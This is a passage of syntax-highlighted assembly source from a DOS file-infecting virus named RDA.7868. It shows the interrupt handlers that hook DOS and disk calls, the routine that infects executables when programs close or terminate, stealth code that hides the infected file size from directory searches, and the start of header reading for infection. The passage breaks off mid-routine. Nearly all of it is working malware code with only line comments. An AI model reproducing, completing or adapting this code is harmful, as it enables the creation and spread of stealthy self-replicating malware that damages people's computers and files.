         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">++</span><span class="sc2">02h</span><span class="sc4">)],</span><span class="sc8">cs</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">31h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)],</span><span class="sc12">'FS'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">31h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)],</span><span class="sc2">20h</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_init_seed</span><span class="sc0">
</span><span class="sc5">int08_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">int08_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_count</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Increase interrupt 08h counter</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_count</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">int08_exit__</span><span class="sc0">    </span><span class="sc1">; Not zero? Jump to int08_exit__</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; AL = interrupt request/in-servic...</span><span class="sc0">
         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Store initialization command wor...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">
</span><span class="sc5">int08_exit__</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 24h of RDA.7868</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Fail system call in progress</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int13_call</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Call to address of interrupt 13h</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int13_addr</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">fcb_stealth_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get Disk Transfer Area (DTA) add...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Not successful?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fcb_ste_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to fcb_ste_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_extended</span><span class="sc0">    </span><span class="sc1">; Not extended FCB? Jump to not_ex...</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">      </span><span class="sc1">; BX = offset of normal FCB</span><span class="sc0">
</span><span class="sc5">not_extended</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = file time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tst_infected</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">fcb_ste_exit</span><span class="sc0">    </span><span class="sc1">; Not infected? Jump to fcb_ste_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenam_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenam_addr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Store address of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dta_fcb_stat</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">      </span><span class="sc1">; BX = offset of filesize</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">size_stealth</span><span class="sc0">
</span><span class="sc5">fcb_ste_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">
</span><span class="sc5">dta_stealth_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get Disk Transfer Area (DTA) add...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dta_st_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to dta_st_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = file time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tst_infected</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dta_ste_exit</span><span class="sc0">    </span><span class="sc1">; Not infected? Jump to dta_ste_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenam_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenam_addr</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dta_fcb_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; BX = offset of filesize</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">size_stealth</span><span class="sc0">
</span><span class="sc5">dta_ste_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Return far and add option-pop-va...</span><span class="sc0">
</span><span class="sc5">dta_st_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Return far and add option-pop-va...</span><span class="sc0">

</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 21h of RDA.7868</span><span class="sc0">
</span><span class="sc5">int21_patch</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">; Offset of interrupt 21h patching</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">          </span><span class="sc1">; Increase function number</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0efeeh</span><span class="sc0">       </span><span class="sc1">; RDA.7868 function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_terminat</span><span class="sc0">   </span><span class="sc1">; Not equal? Jump to exam_terminat</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patch_ints</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">
</span><span class="sc5">exam_terminat</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">        </span><span class="sc1">; Terminate with return code (no...)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_file</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to infect_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_file</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to infect_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">      </span><span class="sc1">; Get or set file's date and time?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_file</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to infect_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; Find next matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dta_stealth</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to dta_stealth</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">      </span><span class="sc1">; Set PSP address?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_find_ne</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to exam_find_ne</span><span class="sc0">
</span><span class="sc5">dta_stealth</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dta_stealth_</span><span class="sc0">
</span><span class="sc5">exam_find_ne</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">      </span><span class="sc1">; Find next matching file (FCB)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fcb_stealth</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to fcb_stealth</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">      </span><span class="sc1">; Delete file (FCB)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_get_ret</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to exam_get_ret</span><span class="sc0">
</span><span class="sc5">fcb_stealth</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">chkdsk_stat</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exam_get_ret</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to exam_get_ret</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_stealth_</span><span class="sc0">
</span><span class="sc5">exam_get_ret</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">      </span><span class="sc1">; Get return code?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21_exit_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to int21_exit_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">chkdsk_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Random number within thirty-two</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Write string to standard output?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">      </span><span class="sc1">; Not zero? Jump to int21_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">      </span><span class="sc1">; Write string to standard output</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">string</span><span class="sc0">       </span><span class="sc1">; DX = offset of string</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
</span><span class="sc5">int21_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">int21_patch_</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">; Offset of interrupt 21h patching</span><span class="sc0">
</span><span class="sc5">int21_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
</span><span class="sc5">int21_exit__</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int21_call</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Call to address of interrupt 21h</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_prepare</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_patch_</span><span class="sc4">],</span><span class="sc2">1001000011001111b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_patch_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc12">'FS'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_prepare</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_file</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">int21_exit_</span><span class="sc0">     </span><span class="sc1">; No error? Jump to int21_exit_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ss__</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">    </span><span class="sc1">; Store stack segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sp__</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">    </span><span class="sc1">; Store stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; ax = code segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ss__</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Code segment equal to stack seg...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_set_sssp</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to not_set_sssp</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Load SS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc1">; SP = offset of stack_ptr</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">
</span><span class="sc5">not_set_sssp</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">cache_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Examine if disk is cached?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_cach_exam</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to no_cach_exam</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_cache</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">no_cach_exam</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_int</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lod_file_inf</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_time</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AX = file's time</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tst_infected</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_header</span><span class="sc0">     </span><span class="sc1">; Not infected? Jump to read_header</span><span class="sc0">
</span><span class="sc5">infect_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_exi</span><span class="sc0">
</span><span class="sc5">read_header</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_init_seed</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Read twenty-six bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_header_</span><span class="sc0">     </span><span class="sc1">; DX = offset of file_header_</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">move_header</span><span class="sc0">     </span><span class="sc1">; No error? Jump to move_header</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_exit_</span><span class="sc0">
</span><span class="sc5">move_header</span><span class="sc4">:</span><span class="sc0">
